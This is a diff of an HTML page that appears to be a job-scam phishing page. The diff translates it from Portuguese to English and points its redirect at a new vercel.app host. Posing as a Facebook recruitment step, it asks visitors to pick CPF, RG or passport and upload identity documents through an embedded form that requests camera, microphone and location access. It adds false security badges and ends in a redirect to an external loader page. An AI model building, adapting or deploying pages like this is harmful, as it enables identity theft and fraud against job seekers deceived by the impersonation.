@@ -1,27 +1,25 @@
 <!doctype html>
-<html lang="pt-br">
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <!-- área segura p/ notch -->
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Pré-seleção – Confirmação de Identidade</title>
-  <meta name="description" content="Página de pré-seleção: confirme sua identidade e avance para o formulário." />
+  <title>Pre-selection – Identity Confirmation</title>
+  <meta name="description" content="Pre-selection page: confirm your identity and proceed to the form." />
   <meta name="theme-color" content="#0ea5e9" />
-  <!-- Open Graph -->
   <meta property="og:type" content="website" />
-  <meta property="og:title" content="Pré-seleção – Confirmação de Identidade" />
-  <meta property="og:description" content="Escolha o tipo de documento, anexe seus arquivos e avance." />
+  <meta property="og:title" content="Pre-selection – Identity Confirmation" />
+  <meta property="og:description" content="Choose the document type, upload your files and proceed." />
   <meta property="og:image" content="" />
   <meta property="og:url" content="" />
   <style>
     :root{
-      --bg1:#0ea5e9; /* sky-500 */
-      --bg2:#1d4ed8; /* indigo-700 */
+      --bg1:#0ea5e9;
+      --bg2:#1d4ed8;
       --card:#ffffff;
-      --text:#0f172a; /* slate-900 */
-      --muted:#475569; /* slate-600 */
-      --ring:#93c5fd; /* blue-300 */
+      --text:#0f172a;
+      --muted:#475569;
+      --ring:#93c5fd;
       --radius:20px;
     }
     *{box-sizing:border-box}
@@ -31,7 +29,6 @@
       font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,Ubuntu,"Noto Sans",sans-serif;
       color:var(--text);
       background:linear-gradient(160deg,var(--bg1),var(--bg2)) fixed;
-      /* topo bem enquadrado + notch safe */
       min-height:100svh;
       display:flex;
       justify-content:center;
@@ -55,7 +52,7 @@
       background:linear-gradient(135deg, #38bdf8, #2563eb);
       color:white;
       padding:32px 28px 24px;
-      padding-top:calc(32px + env(safe-area-inset-top,0px)); /* garante respiro no topo */
+      padding-top:calc(32px + env(safe-area-inset-top,0px));
     }
     .tag{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);padding:6px 10px;border-radius:999px;font-size:12px;letter-spacing:.2px}
     .title{margin:12px 0 6px;font-weight:800;line-height:1.1;font-size: clamp(22px, 4.5vw, 34px)}
@@ -106,60 +103,59 @@
     @media (prefers-reduced-motion: reduce){*{animation:none !important;transition:none !important}}
   </style>
 </head>
-<body data-next="https://presellemp.vercel.app/loadobg.html">
+<body data-next="https://job-eight-snowy.vercel.app/loadobg.html">
   <main class="card" role="main" aria-labelledby="t">
     <header class="header">
-      <span class="tag" aria-label="etiqueta">
+      <span class="tag" aria-label="tag">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
           <path d="M7 3h7l5 5v13a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1Z" stroke="currentColor" stroke-width="1.6"/>
           <path d="M14 3v4a1 1 0 0 0 1 1h4" stroke="currentColor" stroke-width="1.6"/>
         </svg>
-        Verificação
+        Verification
       </span>
-      <h1 class="title" id="t">Perfeito, agora confirme sua identidade</h1>
-      <p class="subtitle">Este é o ultimo passo para que você possa garantir sua vaga.</p>
+      <h1 class="title" id="t">Perfect, now confirm your identity</h1>
+      <p class="subtitle">This is the last step for you to secure your spot.</p>
     </header>
 
     <section class="content">
-      <!-- Tipo de documento -->
+      <!-- Document type -->
       <div class="section" role="group" aria-labelledby="doclabel">
-        <h3 id="doclabel">Tipo de documento</h3>
+        <h3 id="doclabel">Document type</h3>
         <div class="radios">
           <label class="radio" for="doc_cpf"><input id="doc_cpf" name="doctype" type="radio" value="CPF" /> CPF</label>
           <label class="radio" for="doc_rg"><input id="doc_rg" name="doctype" type="radio" value="RG" /> RG</label>
-          <label class="radio" for="doc_pass"><input id="doc_pass" name="doctype" type="radio" value="PASSAPORTE" /> Passaporte</label>
+          <label class="radio" for="doc_pass"><input id="doc_pass" name="doctype" type="radio" value="PASSPORT" /> Passport</label>
         </div>
-        <div id="err" class="error" role="alert">Selecione um tipo de documento para continuar.</div>
+        <div id="err" class="error" role="alert">Select a document type to continue.</div>
       </div>
 
-      <!-- Upload (trocado pelo forms.app) -->
+      <!-- Upload -->
       <div class="section">
-        <h3>Após fazer o upload dos documentos clique no botão verificar</h3>
+        <h3>After uploading the documents click the verify button</h3>
         <div class="filebox">
-          <!-- EMBED forms.app -->
-          <iframe id="" allowtransparency="true" allowfullscreen="true" allow="geolocation; microphone; camera" src="https://xpwtkcmp.forms.app/form/68c2a7c258c4ae000252d085" frameborder="0" style="width: 100%; min-width:100%; height:1130px; border:none;"></iframe>
+          <iframe allowtransparency="true" allowfullscreen="true" allow="geolocation; microphone; camera" src="https://xpwtkcmp.forms.app/form/68c2a7c258c4ae000252d085" frameborder="0" style="width: 100%; min-width:100%; height:1130px; border:none;"></iframe>
         </div>
       </div>
 
-      <!-- Selo de segurança -->
+      <!-- Security badge -->
       <div class="section">
-        <div class="security" aria-label="Selo de segurança de dados">
+        <div class="security" aria-label="Data security badge">
           <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
             <path d="M12 2l7 3v6c0 5-3.5 9.5-7 11-3.5-1.5-7-6-7-11V5l7-3Z" stroke="#1d4ed8" stroke-width="1.6"/>
             <path d="M8.5 12l2.5 2.5L15.5 10" stroke="#1d4ed8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
           </svg>
-          <p>Seus dados estão protegidos com segurança</p>
+          <p>Your data is securely protected</p>
         </div>
       </div>
 
       <div class="actions">
-        <button id="send" class="btn" type="button" aria-label="Enviar e avançar">Enviar</button>
+        <button id="send" class="btn" type="button" aria-label="Send and continue">Send</button>
       </div>
     </section>
 
     <footer class="footer">
-      <span>🔒 Seus dados estão seguros.</span>
-      <span>Suporte: <a href="mailto:trabalheconosco@facebook.com">trabalheconosco@facebook.com</a></span>
+      <span>🔒 Your data is safe.</span>
+      <span>Support: <a href="mailto:trabalheconosco@facebook.com">trabalheconosco@facebook.com</a></span>
     </footer>
   </main>
 
@@ -182,11 +178,10 @@
         }
         try{
           const url = new URL(nextBase);
-          // repassa UTMs e adiciona doc_type
           const paramsHere = new URLSearchParams(window.location.search);
           paramsHere.forEach((v,k)=>{ if(!url.searchParams.has(k)) url.searchParams.set(k,v); });
           url.searchParams.set('doc_type', type);
-          window.location.assign(url.toString()); // mesma aba
+          window.location.assign(url.toString());
         }catch(e){
           window.location.assign(nextBase);
         }
